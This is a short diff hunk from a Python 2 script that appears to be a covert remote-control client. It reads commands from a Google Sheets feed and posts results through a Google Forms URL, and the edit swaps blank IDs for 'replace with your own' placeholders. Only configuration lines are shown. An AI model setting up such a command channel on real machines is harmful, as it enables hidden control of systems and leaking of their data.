@@ -9,8 +9,8 @@ import __main__,urllib,urllib2,httplib,base64,threading,random,platform,os,subpr
 from socket import *
 from HTMLParser import HTMLParser
 cmdrcv=''
-feed="https://spreadsheets.google.com/feeds/list/          /1/public/basic?alt=rss"
-actionurl="https://docs.google.com/forms/d/e/              /formResponse"
+feed="https://spreadsheets.google.com/feeds/list/[REPLACE_WITH_YOUR_OWN]/1/public/basic?alt=rss"
+actionurl="https://docs.google.com/forms/d/e/[REPLACE_WITH_YOUR_OWN]/formResponse"
 cmdz='entry.       ' 
 resp='entry.       '
 connected='entry.      '
